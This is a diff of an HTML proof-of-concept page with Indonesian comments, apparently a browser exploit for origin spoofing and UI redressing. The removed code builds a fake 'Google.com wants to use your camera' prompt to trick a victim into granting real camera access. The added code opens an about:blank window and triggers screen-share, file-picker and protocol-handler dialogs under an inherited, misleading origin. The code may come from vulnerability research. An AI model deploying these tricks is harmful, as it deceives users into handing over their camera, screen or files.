@@ -1,116 +1,58 @@
 <!doctype html>
 <html>
 <head>
+<style>html { font-family: sans-serif; background: transparent; }</style>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-    body { font-family: sans-serif; background: transparent; text-align: center; padding-top: 50px; color: #333; }
-    h2 { font-size: 1.5em; }
-</style>
 </head>
 <body>
-    <h2>Tap anywhere to execute The Ultimate Redress</h2>
-
 <script>
+var searchParams = new URLSearchParams(window.location.search);
+var mode = searchParams.get('mode');
+
+const clickAgainInstructions = '<meta name="viewport" content="width=device-width, initial-scale=1"><style>html { font-family: sans-serif; text-align:center; padding-top: 20vh; }</style><h2>Tap screen to trigger Native API</h2>';
+
 window.addEventListener('click', () => {
-    // Buka about:blank buat ngunci Address Bar
+    // Trik "about:blank" inheritance dari Alesandro tetep dipakai!
     var newWin = window.open('about:blank');
     
-    // THE ULTIMATE UI REDRESSING PAYLOAD (100% CLONE DARI GAMBAR LU)
-    var fakePromptHTML = `
-    <!doctype html>
-    <html>
-    <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-    <style>
-        body, html { 
-            margin: 0; padding: 0; height: 100%; 
-            background: #5a5a5c; /* Warna background abu-abu gelap dari gambar lu */
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            display: flex; flex-direction: column; justify-content: flex-end; 
-            overflow: hidden;
-            user-select: none;
-        }
-        /* Bottom Sheet yang ngambang */
-        .sheet { 
-            background: #2d3034; 
-            border-radius: 20px; 
-            padding: 24px; 
-            box-sizing: border-box; 
-            margin: 0 15px 15px 15px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .header { display: flex; align-items: center; margin-bottom: 24px; }
-        .icon-wrapper { 
-            background: #395585; 
-            width: 42px; height: 42px; 
-            border-radius: 50%; 
-            display: flex; align-items: center; justify-content: center; 
-            margin-right: 16px; flex-shrink: 0;
-        }
-        /* Ikon Kamera Native */
-        .icon-wrapper svg { width: 22px; height: 22px; fill: #d1dfff; }
-        .title { flex: 1; line-height: 1.4; color: #e8eaed; font-size: 16px; }
-        .title b { color: #ffffff; font-weight: 500; font-size: 16.5px; }
-        
-        /* Tombol-tombol biru gelap */
-        .btn { 
-            background: #32476d; 
-            color: #d1dfff; 
-            border: none; 
-            padding: 16px; 
-            border-radius: 12px; 
-            width: 100%; 
-            font-size: 14.5px; 
-            font-weight: 500; 
-            margin-bottom: 8px; 
-            cursor: pointer; 
-            text-align: center; 
-            transition: 0.1s;
-        }
-        .btn:last-child { margin-bottom: 0; }
-        .btn:active { background: #283a5a; }
-    </style>
-    </head>
-    <body>
-        <div class="sheet">
-            <div class="header">
-                <div class="icon-wrapper">
-                    <svg viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
-                </div>
-                <div class="title"><b>Google.com</b> wants to use your camera</div>
-            </div>
-            <!-- Tombol Fake -->
-            <button class="btn" id="btn-allow">Allow while visiting the site</button>
-            <button class="btn" id="btn-once">Allow this time</button>
-            <button class="btn" id="btn-deny">Never allow</button>
-        </div>
+    setTimeout(() => {
+        switch (mode) {
+            case 'screenshare':
+                // BYPASS 1: MediaProjection System Dialog (Screen Recording)
+                // Berbeda dengan getUserMedia (Kamera), ini memanggil UI OS Android!
+                newWin.addEventListener('click', async () => {
+                    try {
+                        await newWin.navigator.mediaDevices.getDisplayMedia({video: true});
+                    } catch (e) { console.log(e); }
+                });
+                newWin.document.body.innerHTML = clickAgainInstructions + "<p>Target: System Screen Share UI</p>";
+                break;
 
-        <script>
-            // LOGIC KETIKA KORBAN KETIPU KLIK TOMBOL FAKE
-            function triggerRealPermission() {
-                // Hapus UI Fake biar gak numpuk
-                document.body.innerHTML = '<div style="height:100vh; background:#202124;"></div>';
-                
-                // Minta permission kamera asli (Korban udah kena priming/psikologis)
-                navigator.mediaDevices.getUserMedia({video: true})
-                .then(stream => alert('CRITICAL: CAMERA GRANTED TO ATTACKER!'))
-                .catch(err => console.log('Denied'));
-            }
+            case 'filesystem':
+                // BYPASS 2: Native Android File Picker
+                // Origin (googlelogoligature) akan dikirim ke OS File Manager
+                newWin.addEventListener('click', async () => {
+                    try {
+                        await newWin.showOpenFilePicker({
+                            types: [{ description: 'Images', accept: {'image/*': ['.png', '.gif', '.jpeg', '.jpg']} }]
+                        });
+                    } catch (e) { console.log(e); }
+                });
+                newWin.document.body.innerHTML = clickAgainInstructions + "<p>Target: System File Picker UI</p>";
+                break;
 
-            document.getElementById('btn-allow').onclick = triggerRealPermission;
-            document.getElementById('btn-once').onclick = triggerRealPermission;
-            
-            document.getElementById('btn-deny').onclick = () => {
-                window.close(); // Tutup window kalau dia nolak
-            };
-        <\/script>
-    </body>
-    </html>
-    `;
-    
-    // Inject CSS & HTML Super Powerfull ke dalam about:blank
-    newWin.document.write(fakePromptHTML);
-    newWin.document.close();
+            case 'protocol':
+                // BYPASS 3: Register Protocol Handler
+                // Memanggil popup instalasi handler yang punya class UI berbeda
+                newWin.addEventListener('click', () => {
+                    try {
+                        newWin.navigator.registerProtocolHandler("web+secure", "https://googlelogoligature.com/?q=%s", "Secure Handler");
+                    } catch (e) { console.log(e); }
+                });
+                newWin.document.body.innerHTML = clickAgainInstructions + "<p>Target: Protocol Handler UI</p>";
+                break;
+        }
+    }, 150);
 });
 </script>
 </body>
